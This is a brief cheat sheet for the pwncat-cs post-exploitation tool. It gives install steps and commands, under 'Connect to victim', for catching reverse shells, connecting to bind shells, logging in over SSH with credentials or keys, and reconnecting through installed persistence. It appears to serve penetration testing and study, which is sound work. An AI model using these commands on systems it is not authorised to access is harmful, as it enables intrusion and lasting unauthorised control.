# PwnCat

{% embed url="https://github.com/calebstewart/pwncat" %}

### Installation

```bash
pip install pwncat-cs
```

### Connect to victim

```bash
# Connect to a bind shell
pwncat-cs connect://10.10.10.10:4444
pwncat-cs 10.10.10.10:4444
pwncat-cs 10.10.10.10 4444

# Listen for reverse shell
pwncat-cs bind://0.0.0.0:4444
pwncat-cs 0.0.0.0:4444
pwncat-cs :4444
pwncat-cs -lp 4444

# Connect via ssh
pwncat-cs ssh://user:password@10.10.10.10
pwncat-cs user@10.10.10.10
pwncat-cs user:password@10.10.10.10
pwncat-cs -i id_rsa user@10.10.10.10

# SSH w/ non-standard port
pwncat-cs -p 2222 user@10.10.10.10
pwncat-cs user@10.10.10.10:2222

# Reconnect utilizing installed persistence
#   If reconnection fails and no protocol is specified,
#   SSH is used as a fallback.
pwncat-cs reconnect://user@10.10.10.10
pwncat-cs reconnect://user@c228fc49e515628a0c13bdc4759a12bf
pwncat-cs user@10.10.10.10
pwncat-cs c228fc49e515628a0c13bdc4759a12bf
pwncat-cs 10.10.10.10
```
